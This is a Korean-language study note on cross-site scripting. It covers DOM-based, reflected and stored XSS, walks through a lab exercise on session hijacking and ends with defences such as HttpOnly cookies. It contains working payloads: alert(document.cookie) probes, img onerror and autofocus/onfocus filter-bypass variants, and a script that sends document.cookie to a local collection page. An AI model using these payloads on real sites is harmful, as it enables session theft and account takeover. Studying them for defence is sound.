---
CMDS: Security
관련 문서:
  - "[[109 Security]]"
tags:
  - "#XSS"
---

## Cross-Site Script

- 사용자에게 행해지는 공격
- CSS가 기존에 사용되던 언어이기 때문에 XSS로 표기
- A사이트에서 B사이트로 이동될때 행해지는 공격

  

#### 공격 대상
1. 기능적인 공격 대상
    - 사용자 입력 값이 필요한 부분이 존재한다면 공격 대상이 될 수 있음
2. 엔드 포인트 단의 공격 대상
    - 서버가 아닌 사용자를 대상으로 공격 진행
    - 기업의 보안이 강화됨에 따라 서버보다 클라이언트의 공격이 잦아짐

#### 공격 유형
1. 피싱
    - 악의적인 사용자가 유도한 사이트로 리다이렉션
2. 악성코드 유포
    - 강제 악성코드 다운로드 및 실행 후 악성코드 설치
    - Drive-by Download
3. XSS Tunnel + XSS Shell
    - 사용자 웹 브라우저 권한 획득
4. 세션 하이재킹
    - 사용자 세션을 탈취 후 세션 재사용. 권한 탈취
5. CSRF
    - 악성 스크립트에 의해 악의적인 사용자가 의도한 행위를 함

#### 공격 기법

1. DOM-Based XSS
    
    - ==웹 브라우저==에서 사용자 입력 값을 통해 동적 페이지 구성
    - 사용자 정보를 URL에서 추출하여 페이지에서 출력되도록 함
    
    ![[90. Settings/92. Attachments/Untitled 7.png|Untitled 7.png]]
    
2. Reflected XSS
    
    - ==서버 측==에서 사용자 입력 값을 통한 동적 페이지 구성
    
    ![[90. Settings/92. Attachments/Untitled 1 2.png|Untitled 1 2.png]]
    
3. Stored XSS
    
    - ==데이터베이스==에 저장된 데이터를 통한 동적 페이지 구성
    
    ![[90. Settings/92. Attachments/Untitled 2 3.png|Untitled 2 3.png]]
    
      
    

실습

XSS 취약성 확인 방법

alert()

confirm()

prompt()

1. DOM-Based XSS
    
    innerHTML에서는 출력이 안되지만, document.write()에서는 출력 가능
    
    `<script>alert(document.cookie)</script>`
    
    `<img src=”” onerror=”alert(document.cookie)”>`
    
    웹 브라우저가 스크립트를 불러오면서 악성 스크립트가 불러지게 됨
    
    ![[90. Settings/92. Attachments/Untitled 3 2.png|Untitled 3 2.png]]
    
2. Reflected XSS
    
    공격자가 보낸 문자가 다시 돌아와 출력 되면 XSS공격이 가능할 수 있음
    
    ![[90. Settings/92. Attachments/Untitled 4 2.png|Untitled 4 2.png]]
    
    ![[90. Settings/92. Attachments/Untitled 5 2.png|Untitled 5 2.png]]
    
    ![[90. Settings/92. Attachments/Untitled 6 2.png|Untitled 6 2.png]]
    
3. Stored XSS
    
    게시글이나 댓글 등 데이터베이스 상에 악성코드를 심는 방식
    
    ![[90. Settings/92. Attachments/Untitled 7 2.png|Untitled 7 2.png]]
    
    게시글 클릭 시 다음과 같은 화면 출력
    
    ![[Untitled 8.png]]
    
      
    

세션 하이재킹에 대한 이해와 공격 원리

session : 사용자를 식별할 수 있는 상태 관리

→ 세션을 탈취당하면 해커가 다른사람인 척 행동하는게 가능 (아이디, 패스워드 없이 계정 도용 가능)

![[Untitled 9.png]]

  

실습

공격자가 session을 탈취하기 위해서는 게시글이나 댓글 등을 통해 게시판을 사용하는 유저가 이 게시글을 볼 때 세션 정보를 가져오도록 함

→ <script>location.href="http://127.0.0.1/www/session.php?session="+document.cookie</script>

1. 게시판에 세션을 탈취하기 위한 글 설정
    
    ![[Untitled 10.png]]
    
    1-2. 사용자가 세션이 넘어갔다는 사실을 모르게 다시 작성
    
    ![[Untitled 11.png]]
    
2. 다른 사용자가 해당 글을 볼 시 세션 정보가 넘어감
    
    ![[Untitled 12.png]]
    
3. 응답 메세지 해더에 set-cookie값을 얻어온 세션 값으로 대체
    
    ![[Untitled 13.png]]
    
    ⇒
    
    ![[Untitled 14.png]]
    
4. 이후 로그인 정보가 바뀌어져 있는 것을 확인할 수 있음
    
    ![[Untitled 15.png]]
    
    - 웹 브라우저 개발자모드에서도 세션 변경 가능
        
        ![[Untitled 16.png]]
        
          
        

마이페이지에서의 XSS 공격

html이 어떻게 작성되었는지 가정

<input type=”text” class=”form-control” name=”name” placeholder=”Name Input” value=”해커”><script>alert(document.cookie);</script>”>

  

1. 사용자 이름을 바꾸어 공격 실행

![[Untitled 17.png]]

→ 마이페이지에 들어갈때마다 세션 값이 나오는것을 확인할 수 있음

  

꺽쇠가 들어가지 못하는 경우 ⇒ 더블쿼터는 입력 가능해야 함 → 이벤트 핸들러 이용

<input type=”text” class=”form-control” name=”name” placeholder=”Name Input” value=”해커” onfocus=”alert(document.cookie)” autofocus=””>

  

대응방안

보안과 서비스가 반비례하기 때문에 XSS취약점은 대응하기 까다로움

XSS공격을 위해서는 더블쿼터, 꺽쇠가 반드시 필요

![[Untitled 18.png]]

사용자 입력 값의 용도 파악 후 각각 용도에 맞게 대응

  

보안 라이브러리

![[Untitled 19.png]]

  

세션 하이재킹 막는 방법

1) XSS 방어

2) HTTPOnly 헤더 적용 - document.cookie 객체 접근 불가능

3) 세션 발급 시 인증 IP 넣기(IP 검증) → 페이지 요청이 들어올 때마다 IP 검증을 해야 함